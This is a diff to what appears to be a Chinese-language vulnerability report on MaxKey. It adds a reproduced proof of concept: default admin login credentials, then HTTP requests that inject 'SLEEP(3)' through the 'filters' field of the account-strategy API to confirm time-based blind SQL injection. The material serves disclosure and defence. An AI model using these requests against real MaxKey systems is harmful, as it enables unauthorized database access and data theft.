@@ -140,8 +140,109 @@ Content-Type: application/json
 4. **优先使用白名单**：`[a-zA-Z0-9_,\s]+` 形式的严格正则
 5. **最小权限**：数据库账户应禁用 `FILE` 权限、关闭 `secure_file_priv`
 
+## 实机验证（已复现）
+
+**环境**：MaxKey 最新分支 Docker 部署，MaxKey-MGT 运行于 192.168.217.135:39526
+
+### 步骤1：获取登录 State Token
+
+**请求报文**：
+```http
+GET /maxkey-mgt-api/login/get HTTP/1.1
+Host: 192.168.217.135:39526
+```
+
+**响应报文**：
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"code":0,"message":null,"data":{"captcha":"NONE","inst":{"id":"1","name":"马克思钥匙","fullName":"MaxKey(马克思钥匙)单点登录认证系统",...},"state":"eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE3NzYxNDMwNDAsImp0aSI6IjEyNDE0MTMyMTM4Mjg5Mzk3NzYifQ.8nPsuK-T996LOk6dgcbhownu_TTYz8kd-BpqfePAzVxC8luJMpdJjR48_lch8Q4LPm0zAxn0gjnCf5yydFYdCQ"}}
+```
+
+（`captcha:"NONE"` 说明在 `LOGIN_CAPTCHA=false` 环境变量下验证码被禁用）
+
+### 步骤2：管理员登录获取 Bearer Token
+
+**请求报文**：
+```http
+POST /maxkey-mgt-api/login/signin HTTP/1.1
+Host: 192.168.217.135:39526
+Content-Type: application/json
+
+{"username":"admin","password":"maxkey","authType":"normal","state":"eyJhbGciOiJIUzUxMiJ9...","captcha":""}
+```
+
+**响应报文**：
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"code":0,"message":null,"data":{"ticket":"1241413214642634752","type":"Bearer","token":"eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImluc3RJZCI6IjEi...","twoFactor":"0","id":"1","name":"admin","username":"admin","displayName":"系统管理员","instId":"1","authorities":["ROLE_ADMINISTRATORS","ROLE_ALL_USER",...],"expired":600}}
+```
+
+### 步骤3：正常添加账户策略（无注入）
+
+**请求报文**：
+```http
+POST /maxkey-mgt-api/config/accountsstrategy/add HTTP/1.1
+Host: 192.168.217.135:39526
+Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImluc3RJZCI6IjEi...
+Content-Type: application/json
+
+{"name":"normal_strategy","appId":"1","appName":"TestApp","mapping":"username","instId":"1","status":"1","createType":"automatic","filters":"1=1","orgIdsList":""}
+```
+
+**响应报文**：
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"code":0,"message":null,"data":null}
+```
+
+（`code:0` 表示成功插入策略，正常执行耗时约 280ms）
+
+### 步骤4：时间盲注验证（SLEEP(3) 注入）
+
+**请求报文**：
+```http
+POST /maxkey-mgt-api/config/accountsstrategy/add HTTP/1.1
+Host: 192.168.217.135:39526
+Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImluc3RJZCI6IjEi...
+Content-Type: application/json
+
+{"name":"poc_sqli_sleep","appId":"1","appName":"TestApp","mapping":"username","instId":"1","status":"1","createType":"automatic","filters":"1=1 AND SLEEP(3)","orgIdsList":""}
+```
+
+**响应报文**（耗时 30462ms，MySQL 语句超时取消）：
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"code":2,"message":"\n### Error querying database.  Cause: com.mysql.cj.jdbc.exceptions.MySQLTimeoutException: Statement cancelled due to timeout or client request\n### SQL: select * from mxk_userinfo u where u.instid = ?  and not exists(select 1 from mxk_accounts ac where ac.appid = ? and ac.instid = ? and ac.userid = u.id and ac.createtype='automatic') and (1=1 AND SLEEP(3))\n### Cause: com.mysql.cj.jdbc.exceptions.MySQLTimeoutException: Statement cancelled due to timeout or client request","data":null}
+```
+
+**关键证据**：
+- 响应耗时 **30,462ms**（正常请求 280ms），延迟 ~30 秒
+- 错误信息中明确显示注入的 SQL：`and (1=1 AND SLEEP(3))`
+- MySQL 数据库中存在 60 个用户，`SLEEP(3)` 被执行 60 次（60×3=180s，被 MySQL 超时截断）
+- `${filters}` 直接拼接到 SQL，无任何过滤，时间盲注确认成立
+
+**实际 SQL 注入后的完整查询**：
+```sql
+SELECT * FROM mxk_userinfo u
+WHERE u.instid = ?
+  AND NOT EXISTS (
+    SELECT 1 FROM mxk_accounts ac
+    WHERE ac.appid = ? AND ac.instid = ? AND ac.userid = u.id AND ac.createtype='automatic'
+  )
+  AND (1=1 AND SLEEP(3))    ← 注入点，SLEEP 被执行 60 次
+```
+
 ## 验证环境
 
-- 源代码：MaxKey 最新分支（静态代码分析）
-- 框架：Spring Boot + MyBatis + MySQL/PostgreSQL
+- 源代码：MaxKey 最新分支（代码审计 + Docker 运行时测试）
+- 运行时测试：MaxKey-MGT 部署于 192.168.217.135:39526
+- 框架：Spring Boot + MyBatis + MySQL
 - 日期：2026-04-14
